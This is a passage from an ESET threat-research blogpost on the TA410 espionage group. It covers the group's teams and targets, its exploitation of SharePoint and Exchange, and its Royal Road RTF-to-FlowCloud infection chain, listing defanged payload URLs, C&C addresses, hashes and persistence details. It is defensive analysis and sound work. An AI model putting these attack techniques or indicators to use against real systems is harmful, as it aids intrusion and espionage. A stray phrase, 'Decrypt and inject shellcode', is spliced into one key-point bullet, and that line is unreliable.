2.7066m21.6744-2.7066h6.5018v1.9005h-1.9333v6.525h-2.6274v-6.524h-1.9333l-.0077-1.9014Zm-9.7275,4.2059c0-3.2122,.7086-4.2398,4.0464-4.2398,3.1194,0,4.031,.842,4.031,4.2398v.376h-5.4896v.0909c0,1.4945,.2359,2.0058,1.4587,2.0058,.8226,0,1.45-.0909,1.4896-.9821h2.5413c.0948,.8946-.3269,1.7653-1.0875,2.2456-.9243,.3931-1.9294,.5588-2.9309,.4833-3.276,0-4.0464-1.1088-4.0464-4.2224m-23.7624,5.7874c-1.3214-1.421-1.6134-3.652-1.6134-5.7739s.29-4.35,1.6134-5.7758c1.0333-.9868,2.3994-1.5498,3.828-1.5776h17.7865v14.7048h-17.7865c-1.4285-.0278-2.7946-.5908-3.828-1.5776m43.7423-16.12c.0004-.036-.009-.0714-.0271-.1025-.0116-.0387-.0445-.0628-.086-.0899-.0385-.0194-.0807-.0303-.1237-.0319-.0559-.0087-.1126-.0123-.1692-.0106h-.1508v.5394h.115c.0678,.0013,.1357-.0022,.203-.0106,.0495-.0114,.0968-.0307,.1402-.057,.0317-.0265,.0574-.0594,.0754-.0967,.016-.0456,.0235-.0938,.0222-.1421m.8226,1.3533h-.61l-.5742-.7086h-.1933v.7066h-.4679v-1.913h.7269c.1085-.0031,.2172,.0024,.3248,.0164,.0855,.0088,.1681,.0355,.2426,.0783,.0789,.0405,.1456,.1012,.1933,.1759,.0425,.0819,.0625,.1737,.058,.2658,.0044,.1242-.0384,.2454-.1199,.3393-.0832,.0952-.1884,.1685-.3064,.2136l.7259,.8255Zm.4186-.9203c.0053-.4029-.1547-.7903-.4427-1.072-.2749-.2868-.6574-.4452-1.0546-.4369-.3998-.0086-.7851,.1497-1.0633,.4369-.5856,.5955-.5856,1.5505,0,2.146,.5715,.5851,1.5091,.5962,2.0942,.0247,.0083-.0081,.0166-.0164,.0247-.0247,.289-.2818,.4492-.6703,.4427-1.074m.4253,0c.0069,.5131-.1972,1.0066-.5645,1.3649-.7536,.747-1.9685,.747-2.7221,0-.3705-.3563-.5758-.851-.5665-1.3649-.0083-.5104,.1971-1.001,.5665-1.3533,.7441-.75,1.955-.7561,2.7066-.0135l.0135,.0135c.3662,.3543,.5704,.8438,.5645,1.3533m-64.0238,6.7637h2.1044c1.5563,0,2.32,.6206,2.32,1.74,.0109,.539-.2936,1.0349-.7791,1.2692v.0242c.7243,.1716,1.2395,.8131,1.2509,1.5573,0,1.16-.6767,1.9652-2.5133,1.9652h-2.3828v-6.5559Zm2.0483,2.7588c.7414,0,1.1126-.2591,1.1126-.8893,0-.6767-.4456-.899-1.2799-.899h-.6109v1.7883h.7782Zm.2127,2.7898c.87,0,1.362-.2223,1.362-.9261s-.5007-.9667-1.4829-.9667h-.87v1.8908l.9908,.0019Zm4.9406-1.248l-2.32-4.3007h1.4548l1.5418,3.2267,1.6433-3.2248h1.4084l-2.4659,4.2726v2.2775h-1.2566l-.0058-2.2514Z" /></g></g></svg>        </a>
        <div class="me-2">
          <button class=" navbar-toggler button-hamburger collapsed d-flex d-lg-none flex-column justify-content-around" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="This is toggle button"><span class="toggler-icon top-bar"></span><span class="toggler-icon middle-bar"></span><span class="toggler-icon bottom-bar"></span></button>        </div>
      </div>

      <nav id="navbarNavDropdown" class="collapse navbar-collapse page-navbar"><ul class="navbar-nav"><li class="nav-item d-lg-none"><div class="search-bar-input"><search-bar-component placeholder="Search WeLiveSecurity"class="search-bar-component-wrapper"></search-bar-component></div></li><li class="nav-item"><a class="nav-link" href="/en/tips-advice/" title="TIPS &amp; ADVICE"><span class="">TIPS &amp; ADVICE</span></a></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item"><a class="nav-link" href="/en/business-security/" title="BUSINESS SECURITY"><span class="">BUSINESS SECURITY</span></a></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="" title="ESET RESEARCH" role="button" data-bs-toggle="dropdown"aria-expanded="false">ESET RESEARCH</a><div class="dropdown-menu dropdown-menu-center"><div class="dropdown-items-wrapper"><a class="dropdown-item" href="/en/about-eset-research/" title="About ESET Research"><span class="">About ESET Research</span></a><a class="dropdown-item" href="/en/eset-research/" title="Blogposts"><span class="">Blogposts</span></a><a class="dropdown-item" href="/en/podcasts/" title="Podcasts"><span class="">Podcasts</span></a><a class="dropdown-item" href="/en/white-papers/" title="White papers"><span class="">White papers</span></a><a class="dropdown-item" href="/en/threat-reports/" title="Threat reports"><span class="">Threat reports</span></a></div></div></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item"><a class="nav-link" href="/en/we-live-science/" title="WeLiveScience"><span class="button-link">WeLiveScience</span></a></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="" title="FEATURED" role="button" data-bs-toggle="dropdown"aria-expanded="false">FEATURED</a><div class="dropdown-menu dropdown-menu-center"><div class="dropdown-items-wrapper"><a class="dropdown-item" href="/en/ukraine-crisis-digital-security-resource-center/" title="Ukraine crisis – Digital security resource center"><span class="">Ukraine crisis – Digital security resource center</span></a><a class="dropdown-item" href="/en/we-live-progress/" title="WeLiveProgress"><span class="">WeLiveProgress</span></a><a class="dropdown-item" href="/en/covid-19/" title="COVID-19"><span class="">COVID-19</span></a><a class="dropdown-item" href="/en/resources/" title="Resources"><span class="">Resources</span></a><a class="dropdown-item" href="/en/videos/" title="Videos"><span class="">Videos</span></a></div></div></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="" title="TOPICS" role="button" data-bs-toggle="dropdown"aria-expanded="false">TOPICS</a><div class="dropdown-menu dropdown-menu-center"><div class="dropdown-items-wrapper"><a class="dropdown-item" href="/en/cybersecurity/" title="Digital Security"><span class="">Digital Security</span></a><a class="dropdown-item" href="/en/scams/" title="Scams"><span class="">Scams</span></a><a class="dropdown-item" href="/en/how-to/" title="How to"><span class="">How to</span></a><a class="dropdown-item" href="/en/privacy/" title="Privacy"><span class="">Privacy</span></a><a class="dropdown-item" href="/en/cybercrime/" title="Cybercrime"><span class="">Cybercrime</span></a><a class="dropdown-item" href="/en/kids-online/" title="Kids online"><span class="">Kids online</span></a><a class="dropdown-item" href="/en/social-media/" title="Social media"><span class="">Social media</span></a><a class="dropdown-item" href="/en/internet-of-things/" title="Internet of Things"><span class="">Internet of Things</span></a><a class="dropdown-item" href="/en/malware/" title="Malware"><span class="">Malware</span></a><a class="dropdown-item" href="/en/ransomware/" title="Ransomware"><span class="">Ransomware</span></a><a class="dropdown-item" href="/en/secure-coding/" title="Secure coding"><span class="">Secure coding</span></a><a class="dropdown-item" href="/en/mobile-security/" title="Mobile security"><span class="">Mobile security</span></a><a class="dropdown-item" href="/en/critical-infrastructure/" title="Critical infrastructure"><span class="">Critical infrastructure</span></a><a class="dropdown-item" href="/en/about-eset-research/" title="Threat research"><span class="">Threat research</span></a></div></div></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="" title="ABOUT US" role="button" data-bs-toggle="dropdown"aria-expanded="false">ABOUT US</a><div class="dropdown-menu dropdown-menu-center"><div class="dropdown-items-wrapper"><a class="dropdown-item" href="/en/company/about-us/" title="About WeLiveSecurity"><span class="">About WeLiveSecurity</span></a><a class="dropdown-item" href="/en/our-experts/" title="Our Experts"><span class="">Our Experts</span></a><a class="dropdown-item" href="/en/company/contact-us/" title="Contact Us"><span class="">Contact Us</span></a></div></div></li><hr class="articles-card-divider px-0 m-0" /><li class="nav-item dropdown d-lg-none"><a class="nav-link dropdown-toggle languages" href="/en/" title="English" role="button"data-bs-toggle="dropdown" aria-expanded="false">English</a><div class="dropdown-menu dropdown-menu-center"><div class="dropdown-items-wrapper"><a class="dropdown-item" href="/es/" title="Español">Español</a><a class="dropdown-item" href="/de/" title="Deutsch">Deutsch</a><a class="dropdown-item" href="/pt/" title="Português">Português</a><a class="dropdown-item" href="/fr/" title="Français">Français</a></div></div></li><li class="nav-item ms-auto d-none d-lg-block"><button class="nav-link ms-auto search-button-close" type="button" data-bs-toggle="collapse"data-bs-target=".search-bar-wrapper" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9485 19.9001" fill="#424D56"><path d="m19.5429,17.9473l-4.86-4.852c2.7034-3.5802,1.9927-8.674-1.5874-11.3774C9.5153-.9856,4.4214-.2749,1.718,3.3053-.9854,6.8854-.2747,11.9793,3.3055,14.6827c1.4094,1.0643,3.1273,1.6402,4.8934,1.6406,1.7749.0083,3.5023-.5739,4.91-1.655l4.883,4.829c.207.2113.4912.329.787.326.2948-.0022.5771-.1191.787-.326.4163-.4365.406-1.126-.023-1.55Zm-11.316-3.821c-3.2811-.0017-5.9396-2.663-5.9378-5.9442.0017-3.2811,2.663-5.9396,5.9442-5.9378,1.5726.0008,3.0806.6251,4.1937,1.736,1.1259,1.1056,1.7528,2.6221,1.736,4.2-.0007,1.5744-.6249,3.0845-1.736,4.2-1.1067,1.1254-2.6216,1.7552-4.2,1.746Z" /></svg></button></li></ul><div class="search-bar"><div class="collapse search-bar-wrapper"><div class="search-bar-input"><search-bar-component placeholder="Search WeLiveSecurity"class="search-bar-component-wrapper"></search-bar-component><button class="nav-link search-button-close" type="button" data-bs-toggle="collapse"data-bs-target=".search-bar-wrapper" aria-expanded="false"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.1065 18.0626"><polygon points="10.6883 9.0363 17.4683 15.8163 15.8383 17.4463 9.0583 10.6663 2.2683 17.4463 .6383 15.8163 7.4283 9.0363 .6383 2.2463 2.2683 .6163 9.0583 7.4063 15.8383 .6163 17.4683 2.2463 10.6883 9.0363" /></svg></button></div></div></div></nav>    </div>
  </div>
  <div class="additional-info d-none">
    <div class="container">
      <p>
        Award-winning news, views, and insight from the ESET security community
      </p>
    </div>
  </div>
</header>        <!-- main content -->
        <div id="main">
                
    <div class="container article-page py-5">
        <div class="row">
            <div class="col col-lg-8 pe-lg-0">
                                    <div class="article-header">
    <div class="article-tags mb-2 dark big"><p class="article-tag text-capitalize">ESET Research</p></div>    <h1 class="page-headline">A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity</h1>    <p class="sub-title">ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.</p>
    
    <div class="article-authors d-flex flex-wrap"><div class="article-author d-flex"><a href="/en/our-experts/alexandre-cote-cyr/" title="Alexandre Côté Cyr"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x45/wls/2022/03/alexandre-cote-cyr.jpg" media="(max-width: 768px)" /><img class="author-image me-3"  src="https://web-assets.esetstatic.com/tn/-x45/wls/2022/03/alexandre-cote-cyr.jpg" alt="Alexandre Côté Cyr"  /></picture></a><div class="author-text"><p><a href="/en/our-experts/alexandre-cote-cyr/" title="Alexandre Côté Cyr"><b>Alexandre Côté Cyr</b></a></p></div></div><div class="article-author d-flex"><a href="/en/our-experts/matthieu-faou/" title="Matthieu Faou"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x45/wls/mfaou.jpeg" media="(max-width: 768px)" /><img class="author-image me-3"  src="https://web-assets.esetstatic.com/tn/-x45/wls/mfaou.jpeg" alt="Matthieu Faou"  /></picture></a><div class="author-text"><p><a href="/en/our-experts/matthieu-faou/" title="Matthieu Faou"><b>Matthieu Faou</b></a></p></div></div></div>
    <p class="article-info mb-5">
        <span>27 Apr 2022</span>
        <span class="d-none d-lg-inline">&nbsp;&bull;&nbsp;</span>
        <span class="d-inline d-lg-none">, </span>
        <span>43 min. read</span>
    </p>

    <div class="hero-image-container">
        <picture><source srcset="https://web-assets.esetstatic.com/tn/-x266/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg" media="(max-width: 768px)" /><source srcset="https://web-assets.esetstatic.com/tn/-x425/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg" media="(max-width: 1120px)" /><img class="hero-image"  src="https://web-assets.esetstatic.com/tn/-x700/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg" alt="A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity"  /></picture>    </div>
</div>
                    <div class="article-body">
    <p>ESET researchers have documented and analyzed TA410 activity going back to 2019. TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa. TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks" target="_blank" rel="noopener"><em>LookBack blogpost</em></a>. A year later, the then-new and very complex malware family called <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" target="_blank" rel="noopener"><em>FlowCloud</em></a> was also attributed to TA410.</p>
<p>In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET. This very complex backdoor contains interesting espionage capabilities. ESET will present its latest findings about TA410, including results from ongoing research, during <a href="https://www.botconf.eu/" target="_blank" rel="noopener"><em>Botconf 2022</em></a>. For YARA and Snort rules, consult <a href="https://github.com/eset/malware-ioc" target="_blank" rel="noopener"><em>ESET's GitHub account</em></a>.</p>
<span class="update-block"><p><strong>Key points in this blogpost:</strong>
<ul>
<li>TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog,Decrypt and inject   shellcode and JollyFrog, each with its own toolset and targets.</li>
<li>ESET telemetry shows victims all around the world, mainly in the governmental and education sectors.</li>
<li>TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/" target="_blank" rel="noopener"><em>ProxyLogon</em></a> in March 2021 and <a href="https://web-assets.esetstatic.com/wls/2022/02/eset_threat_report_t32021.pdf" target="_blank" rel="noopener"><em>ProxyShell</em></a> in August 2021.</li>
<li>ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT. It has several interesting capabilities, including:
<ul>
<li>Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.</li>
<li>Monitoring clipboard events to steal clipboard content.</li>
<li>Monitoring file system events to collect new and modified files.</li>
<li>Controlling attached camera devices to take pictures of the compromised computer’s surroundings.</li>
</ul>
</li>
<li>FlowCloud deploys a rootkit to hide its activity on the compromised machine.</li>
<li>The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&amp;C server communications.</li>
<li>TA410 is one of the users of the Royal Road malicious document builder.</li></ul></p></span>
<p>TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.</p>
<p>The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn’t implemented in the loaders we analyzed. However, we found a custom <span style="font-family: 'courier new', courier, monospace;">AntivirusCheck</span> class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products. In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the <span style="font-family: 'courier new', courier, monospace;">auto_start_after_install</span> configuration value.</p>
<p>Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window. This information can help attackers understand stolen data by contextualizing it.</p>
<p>FlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera peripherals and recording audio using a computer’s microphone. This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume.</p>
<h2>Attribution</h2>
<p>ESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts. These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology, and network infrastructure.</p>
<ul>
<li><strong>FlowingFrog</strong> uses <a href="https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html" target="_blank" rel="noopener"><em>Royal Road RTF documents</em></a>, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud.</li>
<li><strong>LookingFrog</strong> uses a first-stage backdoor called X4, and LookBack as a second stage.</li>
<li><strong>JollyFrog</strong> uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT. Part of the activity of this team was described by <a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-" target="_blank" rel="noopener"><em>Fortinet</em></a>, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" target="_blank" rel="noopener"><em>APT10</em></a> (aka A41APT) has conducted recently.</li>
</ul>
<p>FlowingFrog and JollyFrog share network infrastructure – more precisely, the domain <span style="font-family: 'courier new', courier, monospace;">ffca.caibi379[.]com</span>, as mentioned by <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" target="_blank" rel="noopener"><em>Proofpoint</em></a>.</p>
<p>FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article.</p>
<p>In ESET telemetry, we do not see any other overlap between these subgroups. We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure.</p>
<h2>Victimology</h2>
<p>Most TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel. According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe. Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams.</p>
<p>An element worth mentioning is that TA410 targets foreign individuals in China. In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China.</p>
<p>Since 2018, we have seen the following targets, also depicted in Figure 1:</p>
<ul>
<li><strong>FlowingFrog:</strong> University, foreign diplomatic mission of a South Asian country in China, mining company</li>
<li><strong>LookingFrog:</strong> Diplomatic missions, charity, government and industrial manufacturing</li>
<li><strong>JollyFrog:</strong> Education, church, military, diplomatic mission</li>
</ul>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-1.-Map-of-countries-and-verticals-targeted-by-TA410.png"><img class="wp-image-161821" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-1.-Map-of-countries-and-verticals-targeted-by-TA410.png" alt="" width="900" height="464" /></a><p class="caption-text"><em>Figure 1. Map of countries and verticals targeted by TA410</em></p></div></p>
<h2>Initial compromise and typical TTPs</h2>
<p>If we exclude the different backdoors, the three teams use a similar modus operandi. They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint. This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.</p>
<p>The public-facing application compromise approach is what we have seen the most. Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0604" target="_blank" rel="noopener"><em>CVE-2019-0604</em></a>. They then dropped an ASPX webshell that was used to install other malicious components. These were either dropped directly via the webshell or downloaded from a remote server using <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" target="_blank" rel="noopener"><em>certutil.exe</em></a>, a known <a href="https://github.com/LOLBAS-Project/LOLBAS#user-content-the-history-of-the-lolbin" target="_blank" rel="noopener"><em>LOLBin</em></a>.</p>
<p>In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.</p>
<p>In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan. This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in <a href="https://web-assets.esetstatic.com/wls/2022/02/eset_threat_report_t32021.pdf#T3-2021_Threat-report_final-update.indd%3A.262857%3A2610" target="_blank" rel="noopener"><em>ESET Threat Report T3 2021</em></a>.</p>
<p>This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists.</p>
<p>In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (<a href="https://cyber.gc.ca/en/guidance/c2-obfuscation-tools-htran" target="_blank" rel="noopener"><em>HTran</em></a>, <a href="https://github.com/UndefinedIdentifier/LCX" target="_blank" rel="noopener"><em>LCX</em></a>, <a href="https://github.com/rootkiter/EarthWorm" target="_blank" rel="noopener"><em>EarthWorm</em></a>), and lateral movement scripts such as <a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/details/wmiexec-vbs.htm" target="_blank" rel="noopener"><em>WMIExec</em></a>.</p>
<h2>Arsenal</h2>
<h3>TA410 – FlowingFrog</h3>
<p>FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths.</p>
<h4><strong><em>Royal Road and Tendyron downloader</em></strong></h4>
<p>Royal Road is a malicious document builder used by several cyberespionage groups (<a href="https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html" target="_blank" rel="noopener"><em>see the analysis by nao_sec</em></a>). Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target="_blank" rel="noopener"><em>CVE-2017-11882</em></a>. TA410 operators always use the Royal Road encoding bytes: <span style="font-family: 'courier new', courier, monospace;">A9 A4 6E FE</span>, as seen in Figure 2.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-2.-Encoded-Royal-Road-payload.png"><img class="wp-image-161822" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-2.-Encoded-Royal-Road-payload.png" alt="" width="900" height="303" /></a><p class="caption-text"><em>Figure 2. Encoded Royal Road payload</em></p></div></p>
<p>On October 13<sup>th</sup> 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to <a href="https://www.virustotal.com/gui/file/c88d0f7d623b2a2c066dd6b15597d1f4c44d89e7a8e660e28c3494f441826ea5" target="_blank" rel="noopener"><em>VirusTotal</em></a>.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-3.-Royal-Road-RTF-document-found-on-VirusTotal-SHA-1-ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20.png"><img class="wp-image-161823 size-full" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-3.-Royal-Road-RTF-document-found-on-VirusTotal-SHA-1-ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20.png" alt="" width="752" height="685" /></a><p class="caption-text"><em>Figure 3. Royal Road RTF document found on VirusTotal (SHA‑1: </em><span style="font-family: courier new, courier, monospace;">ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20</span>)</p></div></p>
<p>When opened, the document triggers the injection of a custom downloader – a PE executable – into an <span style="font-family: 'courier new', courier, monospace;">iexplore.exe</span> process. The PE resources 103, 104 and 105 contain the payload URLs, XORed with <span style="font-family: 'courier new', courier, monospace;">0xD3</span>. The following files are downloaded and written to disk:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">http://103.139.2[.]93:1702/tdr.dat</span> written to <span style="font-family: 'courier new', courier, monospace;">%localappdata%\Tendyron\Tendyron.exe</span><br />
(SHA-1: <span style="font-family: 'courier new', courier, monospace;">09C76522136B5E9BAB74381FEEE265F7E9B1D550</span>)</li>
<li><span style="font-family: 'courier new', courier, monospace;">http://103.139.2[.]93:1702/okt.dat</span> written to <span style="font-family: 'courier new', courier, monospace;">%localappdata%\Tendyron\OnKeyToken_KEB.dll</span> (SHA‑1: <span style="font-family: 'courier new', courier, monospace;">F359D3C074135BBCA9A4C98A6B6544690EDAE93D</span>)</li>
<li><span style="font-family: 'courier new', courier, monospace;">http://103.139.2[.]93:1702/md.dat</span> written to <span style="font-family: 'courier new', courier, monospace;">%localappdata%\Tendyron\Tendyron.conf</span><br />
(we were not able to retrieve this file)</li>
</ul>
<p>Finally, this process separately downloads <span style="font-family: 'courier new', courier, monospace;">http://103.139.2[.]93:1702/t86.dat</span> (resource 101), loads it into memory, and calls its <span style="font-family: 'courier new', courier, monospace;">startModule</span> export. Unfortunately, we were not able to retrieve this sample.</p>
<p><span style="font-family: 'courier new', courier, monospace;">Tendyron.exe</span> is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking. Persistence for the downloaded payload is established via the <span style="font-family: 'courier new', courier, monospace;">Tendyron</span> value under the Run key <span style="font-family: 'courier new', courier, monospace;">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span>.</p>
<p>When executed, <span style="font-family: 'courier new', courier, monospace;">Tendyron.exe</span> loads the malicious <span style="font-family: 'courier new', courier, monospace;">OnKeyToken_KEB.dll</span>. The export <span style="font-family: 'courier new', courier, monospace;">OnKeyT_ContextInit</span> contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into <span style="font-family: 'courier new', courier, monospace;">iexplore.exe</span> using <span style="font-family: 'courier new', courier, monospace;">WriteProcessMemory</span>.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-4.-Shellcode-decryption-loop.png"><img class="wp-image-161824" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-4.-Shellcode-decryption-loop.png" alt="" width="600" height="175" /></a><p class="caption-text"><em>Figure 4. Shellcode decryption loop</em></p></div></p>
<p>The next stage, injected into<span style="font-family: 'courier new', courier, monospace;"> iexplore.exe</span>, is a backdoor written using the Microsoft Foundation Class (MFC) framework. It also contains RTTI symbols and thus a few C++ class names:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">ClientSocket</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Manager</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">DllManager</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">KernelManager</span></li>
</ul>
<p>These class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations. Its source code was leaked and is now available on <a href="https://github.com/sin5678/gh0st"><em>GitHub</em></a>. Thus, we believe that TA410 developers reused code copied from Farfli.</p>
<p>The C&amp;C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to <span style="font-family: 'courier new', courier, monospace;">114.118.83[.]141</span>.</p>
<p>On VirusTotal, as shown in Figure 5, we can see one more HTTP request to <span style="font-family: 'courier new', courier, monospace;">103.139.2[.]93</span> was triggered during the execution of the RTF file. The result of the request to <span style="font-family: 'courier new', courier, monospace;">http://103.139.2[.]93:1702/SL3716/S8437AEB.DAT</span> was recorded by VirusTotal and the SHA-1 of this encrypted file is <span style="font-family: 'courier new', courier, monospace;">140F81037A76B7B16A00E1D5E0E2CD9F6687F642</span>. This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-5.-URL-requests-seen-by-the-VirusTotal-sandbox-during-execution-of-the-malicious-RTF-document.png"><img class="wp-image-161825" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-5.-URL-requests-seen-by-the-VirusTotal-sandbox-during-execution-of-the-malicious-RTF-document.png" alt="" width="900" height="669" /></a><p class="caption-text"><em>Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document</em></p></div></p>
<p>The identical encrypted file was also downloaded from <span style="font-family: 'courier new', courier, monospace;">http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT</span> by a FlowCloud dropper version 4.1.3 (SHA‑1: <span style="font-family: 'courier new', courier, monospace;">014421BDB1EA105A6DF0C27FC114819FF3637704</span>). A summary of the compromise chain is provided in Figure 6.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-6.-Compromise-chain-from-the-Royal-Road-document-to-FlowCloud.png"><img class="wp-image-161826" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-6.-Compromise-chain-from-the-Royal-Road-document-to-FlowCloud.png" alt="" width="750" height="952" /></a><p class="caption-text"><em>Figure 6. Compromise chain from the Royal Road document to FlowCloud</em></p></div></p>
<h4><em><strong>FlowCloud</strong></em></h4>
<p>FlowCloud is a complex implant written in C++. It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis. Multiple versions of FlowCloud have been identified since 2020, most notably versions <a href="https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis" target="_blank" rel="noopener"><em>4.1.3</em></a> and <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" target="_blank" rel="noopener"><em>5.0.1</em></a> described by Proofpoint. In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3. Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.</p>
<p>This deployment process is very similar to the one described by <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" target="_blank" rel="noopener"><em>Proofpoint</em></a> for version 5.0.1. The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor. We describe these in detail in the upcoming sections.</p>
<h4><strong><em>Loader (</em><span style="font-family: 'courier new', courier, monospace;">ClientLdrExe</span><em>)</em></strong></h4>
